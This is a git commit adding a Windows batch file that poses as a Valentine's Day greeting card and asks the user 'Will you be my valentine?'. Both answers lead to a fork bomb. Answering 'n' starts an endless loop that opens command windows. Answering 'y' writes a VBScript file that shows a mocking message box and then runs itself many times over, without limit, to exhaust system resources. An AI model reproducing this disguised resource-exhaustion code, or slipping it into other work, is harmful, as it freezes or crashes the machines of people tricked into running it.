c0083ec32e895143720e88810978381f4feb51e1
D3D_M4N <48412122+user421921@users.noreply.github.com>
2021-02-10 18:09:48 -0800

    Add files via upload

---
+++ wybmv.bat
@@ -0,0 +1,69 @@
+@echo off
+title Happy Valintine's Day
+echo    ____   ____
+echo   /    \ /    \
+echo  [      V      ]
+echo   \           /
+echo    \         /
+echo     \       /
+echo      \     /
+echo       \   /
+echo        \ /
+echo         V
+
+echo Will you be my valentine?
+set /p yn="y or n ~>"
+if %yn%==n goto 1
+if %yn%==y goto 2
+exit
+:1
+start start start start start start start start start start start start start start start start start start start start start start start start
+goto 1
+
+:2
+set num=%random%
+echo great, have this gift from me
+echo ' > "temp%num%.vbs"
+echo X=MsgBox("trolololololol",4+64,"hehehe") >> "temp%num%.vbs"
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs"
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs"
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
+echo Set WSHShell = WScript.CreateObject("WScript.Shell") >> "temp%num%.vbs"
+echo WSHShell.Run "temp%num%.vbs" >> "temp%num%.vbs" 
